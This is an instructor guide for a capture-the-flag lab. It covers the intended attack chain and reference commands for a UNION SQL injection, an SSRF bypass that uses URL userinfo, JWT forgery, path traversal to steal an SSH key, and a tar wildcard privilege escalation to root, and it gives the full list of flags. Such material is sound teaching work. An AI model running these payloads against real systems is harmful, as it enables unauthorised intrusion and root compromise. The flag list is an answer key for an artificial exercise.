# Instructor Guide — Royal Mint // Operations

## Learning objectives

This chain exercises web reconnaissance, manual SQL injection, URL authority parsing/SSRF, JWT construction, authenticated path traversal, SSH key handling, Linux enumeration, and unsafe privileged wildcard use.

## Intended chain

1. Inspect `/robots.txt` and discover the legacy dossier endpoint.
2. Exploit UNION-based SQL injection in `codename` to read the three-column `classified` table.
3. Recover the web flag, Palermo service token, and the poster-proxy clue.
4. Abuse the poster preview's raw authority check with HTTP userinfo to reach the internal `identity` service.
5. Supply the leaked bearer to `/internal/bootstrap`, obtain the identity flag, signing secret, and required JWT claims.
6. Sign an HS256 admin JWT and enumerate `/api/v1/admin/exports`.
7. Read the crew-transfer log, capture the archive flag, then traverse from the required `daily/` prefix to the escrowed SSH private key.
8. SSH as `berlin`, capture `/home/berlin/user.txt`, and run `sudo -l`.
9. Exploit GNU tar wildcard option injection in the writable ledger directory to execute a command as root.
10. Read `/root/root.txt`.

## Reference commands

Replace `TARGET` and ports as needed.

```bash
curl http://TARGET:8088/robots.txt
curl --get 'http://TARGET:8088/api/v1/dossiers' \
  --data-urlencode "codename=' UNION SELECT codename,clearance,assignment FROM classified-- -"
```

Use the leaked service bearer below in the SSRF payload. The `assets@identity` authority passes the raw prefix check, while the HTTP client connects to `identity`.

```bash
curl --get 'http://TARGET:8088/api/v1/poster-preview' \
  --data-urlencode 'url=http://assets@identity:5001/internal/bootstrap?bearer=LEAKED_TOKEN'
```

Create the token with any JWT tooling using the returned HS256 secret and exact claims. Then:

```bash
TOKEN='SIGNED_JWT'
curl -H "Authorization: Bearer $TOKEN" http://TARGET:8088/api/v1/admin/exports
curl -H "Authorization: Bearer $TOKEN" \
  'http://TARGET:8088/api/v1/admin/export?file=daily/crew-transfer.log'
curl -H "Authorization: Bearer $TOKEN" \
  'http://TARGET:8088/api/v1/admin/export?file=daily/../../evidence/berlin_id_ed25519' \
  -o berlin_id_ed25519
chmod 600 berlin_id_ed25519
ssh -i berlin_id_ed25519 -p 2228 berlin@TARGET
```

On the mint node:

```bash
cat ~/user.txt
sudo -l
cd /opt/mint/ledgers
printf '%s\n' 'cp /bin/bash /tmp/mintroot; chmod 4755 /tmp/mintroot' > payout.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh payout.sh'
sudo /usr/local/bin/backup-ledger
/tmp/mintroot -p
cat /root/root.txt
```

## Flags

- `HackCTF{union_select_opened_the_first_vault}`
- `HackCTF{ssrf_reached_the_professors_private_line}`
- `HackCTF{black_clearance_broke_the_archive}`
- `HackCTF{berlin_has_entered_the_mint}`
- `HackCTF{root_prints_the_final_billion}`

## Difficulty controls

- Easier: give players `/robots.txt` and the phrase “userinfo authority parsing.”
- Intended/insane: provide only the IP, ports, flag format, and scope.
- Harder: remove SQL error details in `web/app.py`, rotate table/column names, and hide the SSH port until the transfer log is found.

## Reset and operations

`./reset.sh` recreates all containers and clears player modifications. Monitor with `docker compose logs -f --tail=100`. For a public class, place the server behind a firewall and allow only the cohort's source IP ranges.
